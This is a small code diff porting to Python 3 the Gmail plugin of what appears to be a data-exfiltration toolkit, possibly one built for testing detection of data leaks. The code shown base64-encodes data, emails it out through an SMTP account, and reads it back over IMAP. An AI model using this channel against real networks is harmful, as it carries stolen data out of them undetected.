@@ -1,4 +1,3 @@
-from __future__ import print_function
 import base64
 import imaplib
 from smtplib import SMTP
@@ -25,7 +24,7 @@ def send(data):
     msg['From'] = gmail_user
     msg['To'] = gmail_user
     msg['Subject'] = "det:toolkit"
-    msg.attach(MIMEText(base64.b64encode(data)))
+    msg.attach(MIMEText(base64.b64encode(data.encode()).decode()))
     app_exfiltrate.log_message(
         'info', "[gmail] Sending {} bytes in mail".format(len(data)))
     mail_server.sendmail(gmail_user, gmail_user, msg.as_string())
@@ -59,7 +58,7 @@ def listen():
                     data = body.split('\r\n')[0]
                     # print(data)
                     try:
-                        app_exfiltrate.retrieve_data(base64.b64decode(data))
+                        app_exfiltrate.retrieve_data(base64.b64decode(data.encode()).decode())
                     except Exception as e:
                         print(e)
                 else:
